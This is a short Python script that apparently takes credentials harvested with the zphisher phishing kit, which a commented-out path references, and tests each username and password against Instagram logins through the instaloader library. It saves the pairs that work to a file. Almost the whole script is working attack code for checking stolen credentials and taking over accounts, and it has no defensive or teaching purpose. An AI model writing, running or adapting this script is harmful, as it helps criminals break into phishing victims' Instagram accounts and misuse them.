import time
import instaloader

def a():
    print('Pipe Loaded: 100%')

def B(): ## pre-release : add filter to remove lines and accounts that are not registered to this datatype
    print('Importing Data 1/3')
    time.sleep(2.3)
    #file2 = open('/home/kali/zphisher/auth/usernames.txt', 'r')
    file1 = open("/Users/maliq/PycharmProjects/UNFS/Load/usernames.txt", "r")
    print('Reading Data 2/3')
    time.sleep(1.3)
    Lines = file1.readlines()
    for line in Lines:
        Data = (format(line.strip()))
        Data = Data[20:]
        Data = Data.split(' Pass: ')
        Account = Data[0]
        Password = Data[1]

        print(f'\nattempting log in: {Account}')
        Password = Password[:]
        time.sleep(1)
        print(f'trying password: {Password}')
        L = instaloader.Instaloader()
        try:
            L.login(Account, Password)
            print(f'Logged into: {Account}')
            f = open("/Loaders/A/True", "a")
            f.write(f'\n{Account}:{Password}')
            f.close()
        except:
            print(f'Login error: {Account}')